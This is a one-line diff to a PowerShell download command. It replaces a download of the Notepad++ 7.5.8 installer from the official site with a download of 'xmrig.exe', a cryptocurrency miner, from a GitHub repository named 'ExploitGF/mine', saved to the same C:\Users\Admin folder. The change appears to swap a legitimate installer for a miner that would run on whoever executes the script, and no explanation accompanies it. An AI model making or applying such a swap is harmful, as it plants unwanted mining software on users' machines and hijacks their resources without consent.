@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("https://notepad-plus-plus.org/repository/7.x/7.5.8/npp.7.5.8.Installer.exe","C:\Users\Admin\npp.7.5.8.Installer.exe")
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/ExploitGF/mine/blob/master/xmrig.exe","C:\Users\Admin\xmrig.exe")
